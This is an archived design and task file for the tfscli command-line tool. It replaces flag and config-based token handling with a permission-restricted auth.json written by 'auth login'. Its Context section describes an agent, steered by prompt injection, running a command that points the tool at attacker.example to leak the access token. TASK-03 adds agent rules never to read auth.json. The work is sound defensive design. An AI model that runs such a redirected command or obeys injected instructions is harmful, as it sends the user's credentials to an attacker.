# 2026-10-01-tasks-auth-login.md

**Status:** Archived

## Context

The PAT is stored in plaintext in the config file, next to settings the user
edits by hand, and tfscli sends it to whatever server URL it is given. A
mistyped URL, or an agent steered by prompt injection into running
`TFSCLI_URL=https://attacker.example tfscli …`, sends the token to the wrong
host. The `--pat` flag additionally puts the token into shell history, the
process list, and agent transcripts.

The work adopts the model opencode uses: the credential lives in a separate
file, written only by an interactive `auth login` command, with restrictive
permissions, and an environment variable carries the same content for CI. The
server URL is stored with the token, so the token is never sent anywhere else.

Decisions taken during planning, recorded so they are not re-litigated:

- Requires `2026-10-01-tasks-xdg-paths.md` to be done first.
- One server. `auth.json` holds exactly one `{url, pat}` pair; there are no
  profiles. Connecting to another server means running `auth login` again,
  which overwrites the file.
- `auth.json` lives at `$XDG_DATA_HOME/tfscli/auth.json`, defaulting to
  `~/.local/share/tfscli/auth.json`, on every OS. It is written with mode
  `0600`; a directory created for it gets `0700`. It is created only by
  `tfscli auth login`.
- `tfscli auth login` takes no flags. It asks for the server URL, then for the
  PAT with hidden input, verifies the pair with a request to
  `{url}/_apis/connectionData`, and writes the file only if the request
  succeeds. It refuses to run when stdin is not a terminal. It reads the TLS
  settings and `apiVersion` from the config file when one exists.
- `TFSCLI_AUTH` carries the whole JSON, `{"url": "…", "pat": "…"}`. When it is
  set, `auth.json` is not read.
- `url` and `pat` come from a single source, `auth.json` or `TFSCLI_AUTH`, so
  the token cannot be paired with a different URL. `--url`, `--pat`,
  `TFSCLI_URL`, `TFSCLI_PAT`, and the `url` and `pat` config keys are removed.
- The URL is normalised before it is stored: lower-case scheme and host, no
  trailing slash.
- The config file becomes optional for the request parameters it holds:
  `collection`, `project`, `apiVersion`, `caBundle`, `insecureSkipVerify`. For
  these the precedence flag > environment > config file > default is
  unchanged, and `--collection`, `-p`, and `--api-version` remain, so an agent
  can pass everything on the command line.
- Hidden input uses `golang.org/x/term`, with `golang.org/x/sys` as its
  indirect dependency. Both are maintained by the Go team, and the Go
  toolchain vendors `x/term` itself. Rejected alternatives: echoed input
  (leaves the token on screen), reading the token from stdin only (puts it in
  another file), and hand-written per-OS syscall code.
- No OS keychain. Against code running as the same user it adds nothing; other
  users are excluded by file permissions, and stolen disks by disk
  encryption. It is reconsidered only if an organisation requires secrets to
  be kept in the system store, and would then be a second backend behind the
  same `auth login`.
- The removal of `--pat` planned in `2026-10-01-tasks-remove-pat-flag.md` is
  part of TASK-01 here.

---

### TASK-01 `auth-source`
**Description:** Take `url` and `pat` only from `$XDG_DATA_HOME/tfscli/auth.json`
or from `TFSCLI_AUTH`. Remove `--url`, `--pat`, `TFSCLI_URL`, `TFSCLI_PAT`, and
the `url` and `pat` config keys. Normalise the URL as described above. When
neither source is present, report a `config` error that tells the user to run
`tfscli auth login`; when `TFSCLI_AUTH` or `auth.json` is not valid JSON or
lacks a field, report a `config` error naming the source.
**Definition of done:** Tests cover the credential coming from `auth.json` and
from `TFSCLI_AUTH`, `TFSCLI_AUTH` taking precedence, both being absent, and
both being malformed. `--url` and `--pat` fail as unknown flags. `make check`
passes.
**Status:** Done

### TASK-02 `auth-login`
**Description:** Add `tfscli auth login` as decided above: the terminal check,
the URL prompt, hidden PAT input through `golang.org/x/term`, verification
against `{url}/_apis/connectionData` with the TLS settings and `apiVersion`
from the config file, and writing `auth.json` with mode `0600` (directory
`0700`). Verification failures are reported through the existing error
categories, and nothing is written. Record `golang.org/x/term` in
`docs/architecture.md` with its rationale and the rejected alternatives.
**Definition of done:** Tests against a stub server cover a successful login,
a rejected token, an unreachable server, and a non-terminal stdin; after a
successful login `auth.json` holds the normalised URL and the PAT, with mode
`0600` on Unix. `docs/architecture.md` lists the dependency. `make check`
passes.
**Status:** Done

### TASK-03 `docs`
**Description:** Bring the documentation in line with the new model:
`docs/project-brief.md` (configuration, authentication, and the keychain
condition in place of "candidate for future versions"), the non-negotiable
constraints in `CLAUDE.md`, `README.md`, `skills/tfscli/SKILL.md` (keeping a
general rule never to pass the token as a command argument and adding a rule
never to read `auth.json`), and `config.example.json`. Record the change in
`CHANGELOG.md` through the `changelog` skill.
**Definition of done:** No document describes `--url`, `--pat`, `TFSCLI_URL`,
`TFSCLI_PAT`, or a PAT in the config file, outside `docs/archive/` and
earlier `CHANGELOG.md` releases. Each document describes `auth login`,
`auth.json`, and `TFSCLI_AUTH` consistently.
**Status:** Done

### TASK-04 `live-check`
**Description:** Run `tfscli auth login` against a real Azure DevOps Server
instance, with a valid and with an invalid PAT, then run `workitem get` with
the stored credential.
**Definition of done:** `_apis/connectionData` is confirmed as a working
verification request, or the verification request is replaced and the change
recorded. Login with a valid PAT succeeds, with an invalid PAT fails with
`auth`, and `workitem get` works afterwards.
**Status:** Skipped — the live check is done separately; any fixes it calls for go into a new tasks file
